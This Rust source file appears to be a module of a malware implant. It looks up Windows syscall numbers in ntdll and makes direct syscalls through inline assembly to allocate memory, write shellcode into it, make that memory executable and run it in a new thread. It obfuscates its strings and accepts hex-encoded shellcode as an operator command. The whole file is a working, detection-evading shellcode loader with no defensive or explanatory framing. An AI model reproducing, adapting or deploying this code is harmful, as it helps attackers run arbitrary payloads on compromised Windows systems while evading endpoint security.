use std::ptr;
use std::ffi::CString;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::core::PCSTR;

unsafe fn get_syscall_number(function_name: &str) -> Option<u16> {
    let dll_name = crate::obfstr!("ntdll.dll");
    let dll_cstr = CString::new(dll_name).ok()?;
    let ntdll = GetModuleHandleA(PCSTR(dll_cstr.as_ptr() as *const u8)).ok()?;
    let func_addr = GetProcAddress(ntdll, PCSTR(function_name.as_ptr()));
    
    if func_addr.is_none() {
        return None;
    }
    
    let func_addr = func_addr.unwrap() as *const u8;
    let stub = std::slice::from_raw_parts(func_addr, 24);
    
    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
        let syscall_num = u16::from_le_bytes([stub[4], stub[5]]);
        return Some(syscall_num);
    }
    
    None
}

unsafe fn do_syscall(
    ssn: u16,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
    _arg5: usize,
    _arg6: usize,
) -> isize {
    let result: isize;
    let ssn_u32 = ssn as u32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        ssn = in(reg) ssn_u32,
        in("rcx") arg1,
        in("rdx") arg2,
        in("r8") arg3,
        in("r9") arg4,
        lateout("rax") result,
        options(nostack, preserves_flags)
    );
    result
}

pub fn inject_shellcode(shellcode: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
    unsafe {
        let nt_alloc = crate::obfstr!("NtAllocateVirtualMemory\0");
        let nt_protect = crate::obfstr!("NtProtectVirtualMemory\0");
        let nt_create_thread = crate::obfstr!("NtCreateThreadEx\0");
        
        let ssn_alloc = get_syscall_number(&nt_alloc)
            .ok_or(crate::obfstr!("init error"))?;
        let ssn_protect = get_syscall_number(&nt_protect)
            .ok_or(crate::obfstr!("init error"))?;
        let ssn_create_thread = get_syscall_number(&nt_create_thread)
            .ok_or(crate::obfstr!("init error"))?;
        
        let current_process = -1isize as usize;
        let mut base_address: *mut std::ffi::c_void = ptr::null_mut();
        let mut region_size = shellcode.len();
        
        let status = do_syscall(
            ssn_alloc,
            current_process,
            &mut base_address as *mut _ as usize,
            0,
            &mut region_size as *mut _ as usize,
            0x3000,
            0x04,
        );
        
        if status != 0 {
            return Err(crate::obfstr!("operation failed").into());
        }
        
        ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            base_address as *mut u8,
            shellcode.len(),
        );
        
        let mut old_protect: u32 = 0;
        let status = do_syscall(
            ssn_protect,
            current_process,
            &mut base_address as *mut _ as usize,
            &mut region_size as *mut _ as usize,
            0x20,
            &mut old_protect as *mut _ as usize,
            0,
        );
        
        if status != 0 {
            return Err(crate::obfstr!("operation failed").into());
        }
        
        let mut thread_handle: usize = 0;
        let status = do_syscall(
            ssn_create_thread,
            &mut thread_handle as *mut _ as usize,
            0x1FFFFF,
            0,
            current_process,
            base_address as usize,
            0,
        );
        
        if status != 0 {
            return Err(crate::obfstr!("operation failed").into());
        }
        
        Ok(crate::obfstr!("Shellcode injected successfully"))
    }
}

pub fn handle_inject_sc(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err(crate::obfstr!("usage error").into());
    }
    
    let mut hex_shellcode = args.join("");
    hex_shellcode = hex_shellcode.trim_matches('"').to_string();
    hex_shellcode = hex_shellcode.replace(" ", "");
    hex_shellcode = hex_shellcode.replace("\n", "");
    hex_shellcode = hex_shellcode.replace("\r", "");
    hex_shellcode = hex_shellcode.replace("\t", "");
    
    if hex_shellcode.is_empty() {
        return Err(crate::obfstr!("invalid input").into());
    }
    
    if hex_shellcode.len() % 2 != 0 {
        return Err(crate::obfstr!("invalid format").into());
    }
    
    let shellcode = hex::decode(&hex_shellcode)?;
    
    if shellcode.is_empty() {
        return Err(crate::obfstr!("decode error").into());
    }
    
    inject_shellcode(&shellcode)
}


